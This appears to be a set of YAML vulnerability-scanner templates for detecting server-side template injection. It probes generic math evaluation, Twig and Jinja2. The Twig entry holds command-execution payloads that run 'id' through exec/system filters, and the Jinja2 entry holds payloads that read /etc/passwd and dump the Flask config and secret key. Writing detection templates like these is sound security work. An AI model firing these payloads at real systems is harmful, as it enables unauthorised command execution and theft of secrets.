id: ssti-math-test
info:
  name: SSTI Math Expression Test
  author: AniipID
  severity: medium
  description: Detects template injection via math expression evaluation
  tags: ssti,template-injection
requests:
  - method: GET
    path:
      - "{{BaseURL}}?name={{7*7}}"
      - "{{BaseURL}}?name=${7*7}"
      - "{{BaseURL}}?name=<%= 7*7 %>"
      - "{{BaseURL}}?name=#{7*7}"
      - "{{BaseURL}}?name={{7*7|safe}}"
    matchers:
      - type: regex
        regex:
          - "49"
          - "\\*\\*"
        condition: or
        name: "ssti-math-evaluated"
---
id: ssti-twig
info:
  name: SSTI Twig Template Engine
  author: AniipID
  severity: critical
  description: Detects Twig template injection leading to RCE
  tags: ssti,twig,php
requests:
  - method: GET
    path:
      - "{{BaseURL}}?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
      - "{{BaseURL}}?name={{['id']|filter('system')}}"
    matchers:
      - type: word
        words:
          - "uid="
          - "_self.env"
        condition: or
        name: "twig-ssti"
---
id: ssti-jinja2
info:
  name: SSTI Jinja2 Template Engine
  author: AniipID
  severity: critical
  description: Detects Jinja2 template injection in Python/Flask apps
  tags: ssti,jinja2,python,flask
requests:
  - method: GET
    path:
      - "{{BaseURL}}?name={{config}}"
      - "{{BaseURL}}?name={{''.__class__.__mro__[1].__subclasses__()}}"
      - "{{BaseURL}}?name={{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
    matchers:
      - type: regex
        regex:
          - "SECRET_KEY"
          - "SQLALCHEMY"
          - "__class__"
          - "root:.*:0:0:"
        condition: or
        name: "jinja2-ssti"
---
